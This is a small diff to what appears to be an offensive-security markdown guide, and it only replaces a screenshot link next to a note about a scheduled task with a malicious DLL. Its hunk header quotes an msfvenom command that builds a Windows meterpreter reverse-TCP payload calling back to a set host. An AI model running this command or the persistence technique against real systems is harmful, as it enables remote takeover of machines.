@@ -151,7 +151,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.145 -o /tmp/payl
 
 - Task scheduled with malicious dll using syscall
 
-![](https://i.imgur.com/wuDFOb3.png)
+![](https://i.imgur.com/CxWTgL5.png)
 
 ## References :books:
 
